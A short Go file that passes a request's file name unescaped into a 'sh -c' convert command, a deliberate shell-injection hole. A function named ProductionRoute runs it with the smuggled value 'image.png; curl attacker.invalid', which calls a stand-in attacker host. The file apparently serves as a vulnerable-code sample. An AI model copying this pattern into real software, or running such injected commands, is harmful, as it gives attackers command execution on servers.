package convert

import "os/exec"

type Request struct{ Name string }

func HandlePublicRequest(request Request) (*exec.Cmd, error) {
	return exec.Command("sh", "-c", "convert "+request.Name), nil
}

func ProductionRoute() error {
	command, err := HandlePublicRequest(Request{Name: "image.png; curl attacker.invalid"})
	if err != nil {
		return err
	}
	return command.Run()
}
